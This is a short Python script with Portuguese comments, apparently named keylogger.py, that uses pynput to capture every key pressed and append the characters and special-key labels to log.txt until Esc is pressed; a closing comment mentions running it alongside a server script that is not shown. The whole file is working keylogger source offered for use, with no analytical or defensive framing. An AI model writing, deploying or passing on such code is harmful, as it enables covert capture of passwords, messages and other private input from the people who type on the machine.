from pynput.keyboard import Key, Listener

def on_press(key):
    try:
        # Verifica se a tecla pressionada é um caractere imprimível
        char = key.char
    except AttributeError:
        # Tecla especial (Shift, Ctrl, Backspace, etc.)
        char = None
    
    if char is not None:
        # Escreve o caractere no arquivo de log
        with open("log.txt", "a") as log_file:
            log_file.write(f'{char}')
    else:
        # Trata teclas especiais
        special_keys = {
            Key.space: ' ',
            Key.enter: '\n',
            Key.backspace: '[BACKSPACE]',
            Key.shift: '[SHIFT]',
            Key.ctrl_l: '[CTRL]',
            Key.alt_l: '[ALT]',
            Key.delete: '[DELETE]',
            Key.tab: '\t'
        }
        if key in special_keys:
            with open("log.txt", "a") as log_file:
                log_file.write(f'{special_keys[key]}')
        else:
            with open("log.txt", "a") as log_file:
                log_file.write(f'[{key}]')

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# Lembre-se, use "python keylogger.py" ou "python server.py" se estiver usando o servidor no terminal do vscode para rodar o keylogger ;D